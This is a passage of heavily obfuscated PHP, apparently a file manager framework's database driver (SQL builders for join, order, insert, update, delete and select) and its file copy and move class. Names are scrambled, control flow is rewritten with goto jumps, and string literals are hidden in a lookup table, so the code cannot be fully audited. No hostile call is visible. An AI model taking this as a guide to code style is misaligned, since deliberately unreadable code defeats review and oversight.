$f∫˘›Ãë»ﬁ = is_string($b¿ï◊§Ø˘¢) ? $b¿ï◊§Ø˘¢ : substr($this->parseWhere($b¿ï◊§Ø˘¢), 6); break; case $a»¿óÑÍ º[934]: parse_str($b¿ï◊§Ø˘¢, $eîëÌ·™®Ò); if (isset($eîëÌ·™®Ò[$a»¿óÑÍ º[912]])) { $Fçïÿ∆¢°¬ = $a»¿óÑÍ º[50] . strtoupper($eîëÌ·™®Ò[$a»¿óÑÍ º[912]]) . $a»¿óÑÍ º[50]; unset($eîëÌ·™®Ò[$a»¿óÑÍ º[912]]); } else { $Fçïÿ∆¢°¬ = $a»¿óÑÍ º[916]; } $C∆è˘úπÈ± = array(); foreach ($eîëÌ·™®Ò as $Eõ€ìÑ–∑ü => $Aì√¶·Úà—) { $C∆è˘úπÈ±[] = $this->parseKey($Eõ€ìÑ–∑ü) . $a»¿óÑÍ º[933] . $this->parseValue($Aì√¶·Úà—); } $f∫˘›Ãë»ﬁ = implode($Fçïÿ∆¢°¬, $C∆è˘úπÈ±); break; } return $f∫˘›Ãë»ﬁ; } protected function parseLimit($d£ü°…ØΩ¢) { $c˘”ﬁ√”…„ =& $_SERVER[£¿ÌÙëü¡¯¯]; return !empty($d£ü°…ØΩ¢) ? $c˘”ﬁ√”…„[48] . $d£ü°…ØΩ¢ . $c˘”ﬁ√”…„[50] : $c˘”ﬁ√”…„[33]; } protected function parseJoin($e◊ÆÎÿä≠Û) { $Cˆ∑à· Ú∑ =& $_SERVER[£¿ÌÙëü¡¯¯]; $cà∆ÛíÙº— = $Cˆ∑à· Ú∑[33]; if (!empty($e◊ÆÎÿä≠Û)) { if (is_array($e◊ÆÎÿä≠Û)) { foreach ($e◊ÆÎÿä≠Û as $f⁄õŸÚá†Û => $FóÛ«∑ﬂûœ) { if (!1 !== stripos($FóÛ«∑ﬂûœ, $Cˆ∑à· Ú∑[935])) { $cà∆ÛíÙº— .= $Cˆ∑à· Ú∑[50] . $FóÛ«∑ﬂûœ; } else { $cà∆ÛíÙº— .= $Cˆ∑à· Ú∑[936] . $FóÛ«∑ﬂûœ; } } } else { $cà∆ÛíÙº— .= $Cˆ∑à· Ú∑[936] . $e◊ÆÎÿä≠Û; } } $cà∆ÛíÙº— = preg_replace($Cˆ∑à· Ú∑[937], think_config($Cˆ∑à· Ú∑[840]) . $Cˆ∑à· Ú∑[938], $cà∆ÛíÙº—); return $cà∆ÛíÙº—; } protected function parseOrder($Cñ°ƒñ•ÃΩ) { $a©éáè¯∞Ÿ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (is_array($Cñ°ƒñ•ÃΩ)) { $D¨É∂áøä  = array(); foreach ($Cñ°ƒñ•ÃΩ as $F∞à´ôÕ¿Â => $e¶Òä ﬁ«∏) { if (is_numeric($F∞à´ôÕ¿Â)) { $D¨É∂áøä [] = $this->parseKey($e¶Òä ﬁ«∏); } else { $e¶Òä ﬁ«∏ = in_array(strtoupper(trim($e¶Òä ﬁ«∏)), array($a©éáè¯∞Ÿ[939], $a©éáè¯∞Ÿ[940])) ? $a©éáè¯∞Ÿ[50] . $e¶Òä ﬁ«∏ : $a©éáè¯∞Ÿ[33]; if (preg_match($a©éáè¯∞Ÿ[941], $F∞à´ôÕ¿Â)) { $D¨É∂áøä [] = $this->parseKey($F∞à´ôÕ¿Â) . $e¶Òä ﬁ«∏; } else { think_exception($a©éáè¯∞Ÿ[942] . $F∞à´ôÕ¿Â); } } } $Cñ°ƒñ•ÃΩ = implode($a©éáè¯∞Ÿ[47], $D¨É∂áøä ); } return !empty($Cñ°ƒñ•ÃΩ) ? $a©éáè¯∞Ÿ[943] . $Cñ°ƒñ•ÃΩ : $a©éáè¯∞Ÿ[33]; } protected function parseGroup($f‚±ÉºÜØ≥) { $Cö£ï…µ¨è =& $_SERVER[£¿ÌÙëü¡¯¯]; return !empty($f‚±ÉºÜØ≥) ? $Cö£ï…µ¨è[944] . $f‚±ÉºÜØ≥ : $Cö£ï…µ¨è[33]; } protected function parseHaving($D≠•æ∫£•ê) { $cœÎç£·◊â =& $_SERVER[£¿ÌÙëü¡¯¯]; return !empty($D≠•æ∫£•ê) ? $cœÎç£·◊â[945] . $D≠•æ∫£•ê : $cœÎç£·◊â[33]; } protected function parseComment($CßΩÙ¯Ê¶Æ) { $bèò≈àçƒ„ =& $_SERVER[£¿ÌÙëü¡¯¯]; return !empty($CßΩÙ¯Ê¶Æ) ? $bèò≈àçƒ„[946] . $CßΩÙ¯Ê¶Æ . $bèò≈àçƒ„[947] : $bèò≈àçƒ„[33]; } protected function parseDistinct($Có¥ß·óÊç) { $bÖ–íÍöâî =& $_SERVER[£¿ÌÙëü¡¯¯]; return !empty($Có¥ß·óÊç) ? $bÖ–íÍöâî[948] : $bÖ–íÍöâî[33]; } protected function parseUnion($dÑ∫ïè´æ‰) { $e≥Ÿ⁄Ò¯»· =& $_SERVER[£¿ÌÙëü¡¯¯]; if (empty($dÑ∫ïè´æ‰)) { return $e≥Ÿ⁄Ò¯»·[33]; } if (isset($dÑ∫ïè´æ‰[$e≥Ÿ⁄Ò¯»·[333]])) { $b †ô¡≈óí = $e≥Ÿ⁄Ò¯»·[949]; unset($dÑ∫ïè´æ‰[$e≥Ÿ⁄Ò¯»·[333]]); } else { $b †ô¡≈óí = $e≥Ÿ⁄Ò¯»·[950]; } foreach ($dÑ∫ïè´æ‰ as $f…ÖÉÆ‘Ã©) { $e˘ÈÒ¶Ëãﬁ[] = $b †ô¡≈óí . (is_array($f…ÖÉÆ‘Ã©) ? $this->buildSelectSql($f…ÖÉÆ‘Ã©) : $f…ÖÉÆ‘Ã©); } return implode($e≥Ÿ⁄Ò¯»·[50], $e˘ÈÒ¶Ëãﬁ); } public function insert($C€´æˆÂÈ¡, $d≤‹¢”éë≠ = array(), $BªíØﬁ⁄ÚÕ = false) { goto Fú‚¿áõÒƒ; a‰Û¿Ÿ£æü: $fúÊûÌﬂçˆ .= $this->parseComment(!empty($d≤‹¢”éë≠[$EÃÇ≤®®¡à[337]]) ? $d≤‹¢”éë≠[$EÃÇ≤®®¡à[337]] : $EÃÇ≤®®¡à[33]); return $this->execute($fúÊûÌﬂçˆ, $this->parseBind(!empty($d≤‹¢”éë≠[$EÃÇ≤®®¡à[270]]) ? $d≤‹¢”éë≠[$EÃÇ≤®®¡à[270]] : array())); goto b∂√≈„àÏ; Fú‚¿áõÒƒ: $EÃÇ≤®®¡à =& $_SERVER[£¿ÌÙëü¡¯¯]; $F¡ñ©Ê†¬â = $FºÁ˘≥ùÛÎ = array(); $this->model = $d≤‹¢”éë≠[$EÃÇ≤®®¡à[266]]; goto dæÍíÈ≠Ï›; dæÍíÈ≠Ï›: foreach ($C€´æˆÂÈ¡ as $EÇå√§£ÖÎ => $däòÑç‡‡É) { if (is_array($däòÑç‡‡É) && $EÃÇ≤®®¡à[282] == $däòÑç‡‡É[0]) { $FºÁ˘≥ùÛÎ[] = $this->parseKey($EÇå√§£ÖÎ); $F¡ñ©Ê†¬â[] = $däòÑç‡‡É[1]; } elseif (is_scalar($däòÑç‡‡É) || is_null($däòÑç‡‡É)) { $FºÁ˘≥ùÛÎ[] = $this->parseKey($EÇå√§£ÖÎ); $F¡ñ©Ê†¬â[] = $this->parseValue($däòÑç‡‡É); } } $fúÊûÌﬂçˆ = ($BªíØﬁ⁄ÚÕ ? $EÃÇ≤®®¡à[816] : $EÃÇ≤®®¡à[817]) . $EÃÇ≤®®¡à[818] . $this->parseTable($d≤‹¢”éë≠[$EÃÇ≤®®¡à[264]]) . $EÃÇ≤®®¡à[812] . implode($EÃÇ≤®®¡à[47], $FºÁ˘≥ùÛÎ) . $EÃÇ≤®®¡à[813] . implode($EÃÇ≤®®¡à[47], $F¡ñ©Ê†¬â) . $EÃÇ≤®®¡à[814]; $fúÊûÌﬂçˆ .= $this->parseLock(isset($d≤‹¢”éë≠[$EÃÇ≤®®¡à[766]]) ? $d≤‹¢”éë≠[$EÃÇ≤®®¡à[766]] : !1); goto a‰Û¿Ÿ£æü; b∂√≈„àÏ: } public function selectInsert($e¢πÇÜù∂√, $fÕªì·“àÒ, $FìÚ¥í¢åä = array()) { goto a…ÉıõÁË‡; Bé∫êƒöÈ“: return $this->execute($bëÓ∑©úì‡, $this->parseBind(!empty($FìÚ¥í¢åä[$c©Ùú—ﬂ§Ã[270]]) ? $FìÚ¥í¢åä[$c©Ùú—ﬂ§Ã[270]] : array())); goto aÁâãå∞ˆÓ; BªùÍÀÕÔÎ: array_walk($e¢πÇÜù∂√, array($this, $c©Ùú—ﬂ§Ã[815])); $bëÓ∑©úì‡ = $c©Ùú—ﬂ§Ã[951] . $this->parseTable($fÕªì·“àÒ) . $c©Ùú—ﬂ§Ã[812] . implode($c©Ùú—ﬂ§Ã[47], $e¢πÇÜù∂√) . $c©Ùú—ﬂ§Ã[930]; $bëÓ∑©úì‡ .= $this->buildSelectSql($FìÚ¥í¢åä); goto Bé∫êƒöÈ“; a…ÉıõÁË‡: $c©Ùú—ﬂ§Ã =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->model = $FìÚ¥í¢åä[$c©Ùú—ﬂ§Ã[266]]; if (is_string($e¢πÇÜù∂√)) { $e¢πÇÜù∂√ = explode($c©Ùú—ﬂ§Ã[47], $e¢πÇÜù∂√); } goto BªùÍÀÕÔÎ; aÁâãå∞ˆÓ: } public function update($e‚°ÊË©é∏, $b–ä‘ˆíØê) { $A∑€êñÈ“ﬁ =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->model = $b–ä‘ˆíØê[$A∑€êñÈ“ﬁ[266]]; $DÜ¨∂á‹“◊ = $A∑€êñÈ“ﬁ[952] . $this->parseTable($b–ä‘ˆíØê[$A∑€êñÈ“ﬁ[264]]) . $this->parseSet($e‚°ÊË©é∏) . $this->parseWhere(!empty($b–ä‘ˆíØê[$A∑€êñÈ“ﬁ[260]]) ? $b–ä‘ˆíØê[$A∑€êñÈ“ﬁ[260]] : $A∑€êñÈ“ﬁ[33]) . $this->parseOrder(!empty($b–ä‘ˆíØê[$A∑€êñÈ“ﬁ[346]]) ? $b–ä‘ˆíØê[$A∑€êñÈ“ﬁ[346]] : $A∑€êñÈ“ﬁ[33]) . $this->parseLimit(!empty($b–ä‘ˆíØê[$A∑€êñÈ“ﬁ[277]]) ? $b–ä‘ˆíØê[$A∑€êñÈ“ﬁ[277]] : $A∑€êñÈ“ﬁ[33]) . $this->parseLock(isset($b–ä‘ˆíØê[$A∑€êñÈ“ﬁ[766]]) ? $b–ä‘ˆíØê[$A∑€êñÈ“ﬁ[766]] : !1) . $this->parseComment(!empty($b–ä‘ˆíØê[$A∑€êñÈ“ﬁ[337]]) ? $b–ä‘ˆíØê[$A∑€êñÈ“ﬁ[337]] : $A∑€êñÈ“ﬁ[33]); return $this->execute($DÜ¨∂á‹“◊, $this->parseBind(!empty($b–ä‘ˆíØê[$A∑€êñÈ“ﬁ[270]]) ? $b–ä‘ˆíØê[$A∑€êñÈ“ﬁ[270]] : array())); } public function delete($fëÜ¯ãÌÖ≠ = array()) { $aùö‰âçÔﬁ =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->model = $fëÜ¯ãÌÖ≠[$aùö‰âçÔﬁ[266]]; $f…≤¯⁄¶á° = $aùö‰âçÔﬁ[953] . $this->parseTable($fëÜ¯ãÌÖ≠[$aùö‰âçÔﬁ[264]]) . $this->parseWhere(!empty($fëÜ¯ãÌÖ≠[$aùö‰âçÔﬁ[260]]) ? $fëÜ¯ãÌÖ≠[$aùö‰âçÔﬁ[260]] : $aùö‰âçÔﬁ[33]) . $this->parseOrder(!empty($fëÜ¯ãÌÖ≠[$aùö‰âçÔﬁ[346]]) ? $fëÜ¯ãÌÖ≠[$aùö‰âçÔﬁ[346]] : $aùö‰âçÔﬁ[33]) . $this->parseLimit(!empty($fëÜ¯ãÌÖ≠[$aùö‰âçÔﬁ[277]]) ? $fëÜ¯ãÌÖ≠[$aùö‰âçÔﬁ[277]] : $aùö‰âçÔﬁ[33]) . $this->parseLock(isset($fëÜ¯ãÌÖ≠[$aùö‰âçÔﬁ[766]]) ? $fëÜ¯ãÌÖ≠[$aùö‰âçÔﬁ[766]] : !1) . $this->parseComment(!empty($fëÜ¯ãÌÖ≠[$aùö‰âçÔﬁ[337]]) ? $fëÜ¯ãÌÖ≠[$aùö‰âçÔﬁ[337]] : $aùö‰âçÔﬁ[33]); return $this->execute($f…≤¯⁄¶á°, $this->parseBind(!empty($fëÜ¯ãÌÖ≠[$aùö‰âçÔﬁ[270]]) ? $fëÜ¯ãÌÖ≠[$aùö‰âçÔﬁ[270]] : array())); } public function select($BÖ™≥π⁄ëí = array()) { goto CÚΩØ÷ÕÖµ; CÚΩØ÷ÕÖµ: $Fï”—∞™•™ =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->model = $BÖ™≥π⁄ëí[$Fï”—∞™•™[266]]; $dˆ ñƒ”ï° = $this->buildSelectSql($BÖ™≥π⁄ëí); goto a–íóÃàÔº; a–íóÃàÔº: $Aä©‡”ÇÑ» = isset($BÖ™≥π⁄ëí[$Fï”—∞™•™[334]]) ? $BÖ™≥π⁄ëí[$Fï”—∞™•™[334]] : !1; if ($Aä©‡”ÇÑ») { $c·‹êÿ∞∂Ï = is_string($Aä©‡”ÇÑ»[$Fï”—∞™•™[90]]) ? $Aä©‡”ÇÑ»[$Fï”—∞™•™[90]] : $Fï”—∞™•™[954] . md5($dˆ ñƒ”ï°); $Dãﬁøä´¢É = think_cache($c·‹êÿ∞∂Ï, $Fï”—∞™•™[33], $Aä©‡”ÇÑ»); if (!1 !== $Dãﬁøä´¢É) { return $Dãﬁøä´¢É; } } $f≤ÁÿµçÏ„ = $this->query($dˆ ñƒ”ï°, $this->parseBind(!empty($BÖ™≥π⁄ëí[$Fï”—∞™•™[270]]) ? $BÖ™≥π⁄ëí[$Fï”—∞™•™[270]] : array())); goto Fí≈Ô…ÑÂ‚; Fí≈Ô…ÑÂ‚: if ($Aä©‡”ÇÑ» && !1 !== $f≤ÁÿµçÏ„) { think_cache($c·‹êÿ∞∂Ï, $f≤ÁÿµçÏ„, $Aä©‡”ÇÑ»); } return $f≤ÁÿµçÏ„; goto D¡∫“⁄èπ®; D¡∫“⁄èπ®: } public function buildSelectSql($DﬁæﬂøñÀÍ = array()) { goto f‚ﬂÇƒËÚ; fÂÏÊº∑ÿ: return $E´ﬂàÆâÒÚ; goto bè”ﬂï«ûô; f©ÌçÉÒÃÊ: $E´ﬂàÆâÒÚ = $this->parseSql($this->selectSql, $DﬁæﬂøñÀÍ); $E´ﬂàÆâÒÚ .= $this->parseLock(isset($DﬁæﬂøñÀÍ[$c´çûõíèÈ[766]]) ? $DﬁæﬂøñÀÍ[$c´çûõíèÈ[766]] : !1); if (isset($eÌ˜◊Óâ¡„)) { think_cache($eÌ˜◊Óâ¡„, $E´ﬂàÆâÒÚ); } goto fÂÏÊº∑ÿ; f‚ﬂÇƒËÚ: $c´çûõíèÈ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (isset($DﬁæﬂøñÀÍ[$c´çûõíèÈ[336]])) { if (strpos($DﬁæﬂøñÀÍ[$c´çûõíèÈ[336]], $c´çûõíèÈ[47])) { list($bÈàÒÕØÇ©, $c∞ªË€µç…) = explode($c´çûõíèÈ[47], $DﬁæﬂøñÀÍ[$c´çûõíèÈ[336]]); } else { $bÈàÒÕØÇ© = $DﬁæﬂøñÀÍ[$c´çûõíèÈ[336]]; } $bÈàÒÕØÇ© = $bÈàÒÕØÇ© ? $bÈàÒÕØÇ© : 1; $c∞ªË€µç… = isset($c∞ªË€µç…) ? $c∞ªË€µç… : (is_numeric($DﬁæﬂøñÀÍ[$c´çûõíèÈ[277]]) ? $DﬁæﬂøñÀÍ[$c´çûõíèÈ[277]] : 20); $céè·ı∂Ïï = $c∞ªË€µç… * ((int) $bÈàÒÕØÇ© - 1); $DﬁæﬂøñÀÍ[$c´çûõíèÈ[277]] = $céè·ı∂Ïï . $c´çûõíèÈ[47] . $c∞ªË€µç…; } if (think_config($c´çûõíèÈ[955])) { $eÌ˜◊Óâ¡„ = $c´çûõíèÈ[956] . md5(serialize($DﬁæﬂøñÀÍ)); $C∂›ç›Ñ∞É = think_cache($eÌ˜◊Óâ¡„); if ($C∂›ç›Ñ∞É) { return $C∂›ç›Ñ∞É; } } goto f©ÌçÉÒÃÊ; bè”ﬂï«ûô: } public function parseSql($e®ãéÎ‘ûÖ, $bÀæû‰∫Âê = array()) { $dâ≤—¯ø¿ =& $_SERVER[£¿ÌÙëü¡¯¯]; $e®ãéÎ‘ûÖ = str_replace(array($dâ≤—¯ø¿[957], $dâ≤—¯ø¿[958], $dâ≤—¯ø¿[959], $dâ≤—¯ø¿[960], $dâ≤—¯ø¿[961], $dâ≤—¯ø¿[962], $dâ≤—¯ø¿[963], $dâ≤—¯ø¿[964], $dâ≤—¯ø¿[965], $dâ≤—¯ø¿[966], $dâ≤—¯ø¿[967]), array($this->parseTable("{$bÀæû‰∫Âê[$dâ≤—¯ø¿[264]]}"), $this->parseDistinct(isset($bÀæû‰∫Âê[$dâ≤—¯ø¿[968]]) ? $bÀæû‰∫Âê[$dâ≤—¯ø¿[968]] : !1), $this->parseField(!empty($bÀæû‰∫Âê[$dâ≤—¯ø¿[258]]) ? $bÀæû‰∫Âê[$dâ≤—¯ø¿[258]] : $dâ≤—¯ø¿[173]), $this->parseJoin(!empty($bÀæû‰∫Âê[$dâ≤—¯ø¿[267]]) ? $bÀæû‰∫Âê[$dâ≤—¯ø¿[267]] : $dâ≤—¯ø¿[33]), $this->parseWhere(!empty($bÀæû‰∫Âê[$dâ≤—¯ø¿[260]]) ? $bÀæû‰∫Âê[$dâ≤—¯ø¿[260]] : $dâ≤—¯ø¿[33]), $this->parseGroup(!empty($bÀæû‰∫Âê[$dâ≤—¯ø¿[969]]) ? $bÀæû‰∫Âê[$dâ≤—¯ø¿[969]] : $dâ≤—¯ø¿[33]), $this->parseHaving(!empty($bÀæû‰∫Âê[$dâ≤—¯ø¿[970]]) ? $bÀæû‰∫Âê[$dâ≤—¯ø¿[970]] : $dâ≤—¯ø¿[33]), $this->parseOrder(!empty($bÀæû‰∫Âê[$dâ≤—¯ø¿[346]]) ? $bÀæû‰∫Âê[$dâ≤—¯ø¿[346]] : $dâ≤—¯ø¿[33]), $this->parseLimit(!empty($bÀæû‰∫Âê[$dâ≤—¯ø¿[277]]) ? $bÀæû‰∫Âê[$dâ≤—¯ø¿[277]] : $dâ≤—¯ø¿[33]), $this->parseUnion(!empty($bÀæû‰∫Âê[$dâ≤—¯ø¿[332]]) ? $bÀæû‰∫Âê[$dâ≤—¯ø¿[332]] : $dâ≤—¯ø¿[33]), $this->parseComment(!empty($bÀæû‰∫Âê[$dâ≤—¯ø¿[337]]) ? $bÀæû‰∫Âê[$dâ≤—¯ø¿[337]] : $dâ≤—¯ø¿[33])), $e®ãéÎ‘ûÖ); return $e®ãéÎ‘ûÖ; } public function getLastSql($a€çøÔö¯ = '') { return $a€çøÔö¯ ? $this->modelSql[$a€çøÔö¯] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($EƒÙ ‡—Úâ) { return addslashes($EƒÙ ‡—Úâ); } public function setModel($FÃ±õÑñò) { $this->model = $FÃ±õÑñò; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($a£ºÀ»ø√‰, $Cõı£¯Úü) { $d∞≈æ≈∫∞” = self::driverMake($Cõı£¯Úü[0]); if (method_exists($d∞≈æ≈∫∞”, $a£ºÀ»ø√‰)) { return @call_user_func_array(array($d∞≈æ≈∫∞”, $a£ºÀ»ø√‰), $Cõı£¯Úü); } if (method_exists($d∞≈æ≈∫∞”, $_SERVER[£¿ÌÙëü¡¯¯][971])) { return @call_user_func_array(array($d∞≈æ≈∫∞”, $a£ºÀ»ø√‰), $Cõı£¯Úü); } else { if (method_exists(self, $a£ºÀ»ø√‰)) { return @call_user_func_array(array(self, $a£ºÀ»ø√‰), $Cõı£¯Úü); } else { call_user_func_array(array(parent, $a£ºÀ»ø√‰), $Cõı£¯Úü); } } } public static function init($b•≈ãŒ‚©ä) { return self::driverMake($b•≈ãŒ‚©ä); } public static function copy($AäûµôﬁÑ≈, $eëë≥óåÁ‚, $dàÂ‚∞∏®µ = false, $c†ØÀ≥◊Ö = false) { return self::copyMove($AäûµôﬁÑ≈, $eëë≥óåÁ‚, $dàÂ‚∞∏®µ, $_SERVER[£¿ÌÙëü¡¯¯][482], $c†ØÀ≥◊Ö); } public static function move($a–ﬂ¬ªâ™Â, $e»€•∏…óŸ, $EâÇº≈öÁ— = false, $e≠ºõò≤Üà = false) { return self::copyMove($a–ﬂ¬ªâ™Â, $e»€•∏…óŸ, $EâÇº≈öÁ—, $_SERVER[£¿ÌÙëü¡¯¯][484], $e≠ºõò≤Üà); } public static function saveFile($CÏæÙÉÌ∆, $a¶ÿç¬¯Û°, $bÏó¯ºå»∆ = true) { goto b÷ª›º∞Çﬂ; Cì©íäπ⁄Ã: $fÈì∫¡Ç¥È = self::copyFile($fÜÊ‹Ôà∂˜, $CÏæÙÉÌ∆, $eòú∂îµ©ò, $aö±Œ·œåÜ, $C¿†ôÎ§•™[$aπ‹˜π•—û[28]], $BîàãöèÉ≥); if ($fœùÁ´åøÛ) { $fÈì∫¡Ç¥È = $fœùÁ´åøÛ->getPathOuter($fÈì∫¡Ç¥È); } return $fÈì∫¡Ç¥È; goto fù¿†ØäëÆ; Fö¿ùùÜ∏É: $eòú∂îµ©ò = self::driverMake($a¶ÿç¬¯Û°); $fœùÁ´åøÛ = !1; if ($eòú∂îµ©ò->pathParse[$aπ‹˜π•—û[972]]) { $cÁè≠”Ω“≈ = $eòú∂îµ©ò->pathParse[$aπ‹˜π•—û[972]]; $fœùÁ´åøÛ = $eòú∂îµ©ò; $eòú∂îµ©ò = self::driverMake($cÁè≠”Ω“≈); } goto fï´†±»Ωå; fï´†±»Ωå: $aö±Œ·œåÜ = $eòú∂îµ©ò->pathFather($a¶ÿç¬¯Û°); $BîàãöèÉ≥ = !0; if (!$bÏó¯ºå»∆ && self::driverIsSame($fÜÊ‹Ôà∂˜, $eòú∂îµ©ò)) { $BîàãöèÉ≥ = !1; } goto Cì©íäπ⁄Ã; b÷ª›º∞Çﬂ: $aπ‹˜π•—û =& $_SERVER[£¿ÌÙëü¡¯¯]; $C¿†ôÎ§•™ = self::info($a¶ÿç¬¯Û°); $fÜÊ‹Ôà∂˜ = self::driverMake($CÏæÙÉÌ∆); goto Fö¿ùùÜ∏É; fù¿†ØäëÆ: } private static function copyMove($B‰ÁçñÁå÷, $A∂«˘áµÀµ, $EÙ¿÷çé¶Ø, $D¡‘€◊èÊ∫, $A”ä±ö¶’˜ = false) { goto F∏Â†Ø¯í≠; c‘ÏÚÎòﬁÔ: Hook::trigger($f˜ò√è‹¿¿[73], $cœ†ÜﬂËç», $B‰ÁçñÁå÷, $dãÏÜÑ·˘ò, $A∂«˘áµÀµ); $cﬁ†ùµÈÆ∞ = self::driverIsSame($cœ†ÜﬂËç», $dãÏÜÑ·˘ò); if ($cﬁ†ùµÈÆ∞) { if ($D¡‘€◊èÊ∫ == $f˜ò√è‹¿¿[484] && trim($A∂«˘áµÀµ, $f˜ò√è‹¿¿[8]) == trim($dãÏÜÑ·˘ò->pathFather($B‰ÁçñÁå÷), $f˜ò√è‹¿¿[8])) { return $dãÏÜÑ·˘ò->getPathOuter($B‰ÁçñÁå÷); } if (method_exists($dãÏÜÑ·˘ò, $D¡‘€◊èÊ∫)) { return $dãÏÜÑ·˘ò->{$D¡‘€◊èÊ∫}($B‰ÁçñÁå÷, $A∂«˘áµÀµ, $EÙ¿÷çé¶Ø); } } goto eù¬™†ˆÔ; F∏Â†Ø¯í≠: $f˜ò√è‹¿¿ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$B‰ÁçñÁå÷ || $B‰ÁçñÁå÷ == $f˜ò√è‹¿¿[8] || !$A∂«˘áµÀµ) { return !1; } ignore_timeout(); goto B¡††øã≈°; eù¬™†ˆÔ: $e÷ ™ÈóÀü = $cœ†ÜﬂËç»->isFile($B‰ÁçñÁå÷); if (!$e÷ ™ÈóÀü && $dãÏÜÑ·˘ò->getType() == $f˜ò√è‹¿¿[681] && $cœ†ÜﬂËç»->getType() == $f˜ò√è‹¿¿[104]) { $Eı’™™⁄∂ƒ = $dãÏÜÑ·˘ò->copyFolderFromIO($cœ†ÜﬂËç», $B‰ÁçñÁå÷, $A∂«˘áµÀµ, $EÙ¿÷çé¶Ø, $F”¢√ÇâºΩ, $A”ä±ö¶’˜); } else { $Eı’™™⁄∂ƒ = self::copyPath($cœ†ÜﬂËç», $B‰ÁçñÁå÷, $dãÏÜÑ·˘ò, $A∂«˘áµÀµ, $EÙ¿÷çé¶Ø, $F”¢√ÇâºΩ, $e÷ ™ÈóÀü, $A”ä±ö¶’˜); } if ($Eı’™™⁄∂ƒ && $F”¢√ÇâºΩ) { $cœ†ÜﬂËç»->remove($B‰ÁçñÁå÷); } goto AÛä∫ã≈¢; bØ⁄˘Ÿπ›Ö: $dÂØ…¢Çﬂƒ = !1; if ($dãÏÜÑ·˘ò->pathParse[$f˜ò√è‹¿¿[972]]) { $A∂«˘áµÀµ = $dãÏÜÑ·˘ò->pathParse[$f˜ò√è‹¿¿[972]]; $dÂØ…¢Çﬂƒ = $dãÏÜÑ·˘ò; $dãÏÜÑ·˘ò = self::driverMake($A∂«˘áµÀµ); } self::check($cœ†ÜﬂËç», $B‰ÁçñÁå÷, $dãÏÜÑ·˘ò, $A∂«˘áµÀµ); goto c‘ÏÚÎòﬁÔ; B¡††øã≈°: $cœ†ÜﬂËç» = self::driverMake($B‰ÁçñÁå÷); $dãÏÜÑ·˘ò = self::driverMake($A∂«˘áµÀµ); $F”¢√ÇâºΩ = $D¡‘€◊èÊ∫ == $f˜ò√è‹¿¿[484]; goto bØ⁄˘Ÿπ›Ö; AÛä∫ã≈¢: if ($dÂØ…¢Çﬂƒ) { $Eı’™™⁄∂ƒ = $dÂØ…¢Çﬂƒ->getPathOuter($Eı’™™⁄∂ƒ); } return $Eı’™™⁄∂ƒ; goto Fœ¿ñÓë§¯; Fœ¿ñÓë§¯: } private static function check($bä‰“àó£ß, $FåÖ£ÓóÃ„, $Aﬂ∞éµêﬂ‹, &$fÚ±ïü†ñŒ) { $aÂø∂ŸÖ˘— =& $_SERVER[£¿ÌÙëü¡¯¯]; if (self::driverIsSame($bä‰“àó£ß, $Aﬂ∞éµêﬂ‹) && $bä‰“àó£ß->isFolder($FåÖ£ÓóÃ„) && $bä‰“àó£ß->isParentOf($FåÖ£ÓóÃ„, $fÚ±ïü†ñŒ)) { show_json(LNG($aÂø∂ŸÖ˘—[973]), !1); } if (!$bä‰“àó£ß->exist($FåÖ£ÓóÃ„)) { show_json(LNG($aÂø∂ŸÖ˘—[103]), !1); } } private static function copyPath($bûΩ¡üÎ˘≥, $BÑ≥ÖÁ—ô¨, $báãŒ‰˘ß«, $DıÒ ÆÇ„Ö, $dàº¯íµ±Ω, $E¡å§∆¶√√, $d∆áñÑËÑÜ, $CﬁÃÚï∑Àπ = false) { goto eÂﬁÇ‚°Ôâ; EﬁáÀËÿƒç: $CΩ”ëãçèâ = $báãŒ‰˘ß«->mkdir($báãŒ‰˘ß«->getPath($dﬂ≠Öâç∑·)); $DıÒ ÆÇ„Ö = $báãŒ‰˘ß«->getPathInner($CΩ”ëãçèâ); $DÛ«ò∞ÉöÂ = $bûΩ¡üÎ˘≥->listPath($BÑ≥ÖÁ—ô¨, !0); goto CÇŒ®…ò≠¥; CÇŒ®…ò≠¥: $A„ì‰≠üÒﬁ = array_merge($DÛ«ò∞ÉöÂ[$Bÿœ€ñºøÛ[74]], $DÛ«ò∞ÉöÂ[$Bÿœ€ñºøÛ[75]]); foreach ($A„ì‰≠üÒﬁ as $dã∞™Üıçë) { $aßãé‹á„í = $dã∞™Üıçë[$Bÿœ€ñºøÛ[29]] == $Bÿœ€ñºøÛ[164]; $BÑ≥ÖÁ—ô¨ = $bûΩ¡üÎ˘≥->getPathInner($dã∞™Üıçë[$Bÿœ€ñºøÛ[76]]); $FéÉÖ·ÓÜ = self::copyPath($bûΩ¡üÎ˘≥, $BÑ≥ÖÁ—ô¨, $báãŒ‰˘ß«, $DıÒ ÆÇ„Ö, $dàº¯íµ±Ω, $E¡å§∆¶√√, $aßãé‹á„í); if (!$FéÉÖ·ÓÜ) { write_log($Bÿœ€ñºøÛ[974] . $BÑ≥ÖÁ—ô¨ . $Bÿœ€ñºøÛ[975] . $DıÒ ÆÇ„Ö, $Bÿœ€ñºøÛ[976]); } } return $CΩ”ëãçèâ; goto C≤”·–àπé; C¶ÕŒıº∞ø: if ($d∆áñÑËÑÜ) { return self::copyFile($bûΩ¡üÎ˘≥, $BÑ≥ÖÁ—ô¨, $báãŒ‰˘ß«, $DıÒ ÆÇ„Ö, $bê≈≥ÚÑú», $E¡å§∆¶√√); } if ($dàº¯íµ±Ω == REPEAT_RENAME_FOLDER) { $dàº¯íµ±Ω = !1; } $dﬂ≠Öâç∑· = rtrim($DıÒ ÆÇ„Ö, $Bÿœ€ñºøÛ[8]) . $Bÿœ€ñºøÛ[8] . $bê≈≥ÚÑú»; goto EﬁáÀËÿƒç; eÂﬁÇ‚°Ôâ: $Bÿœ€ñºøÛ =& $_SERVER[£¿ÌÙëü¡¯¯]; $bê≈≥ÚÑú» = $CﬁÃÚï∑Àπ ? $CﬁÃÚï∑Àπ : 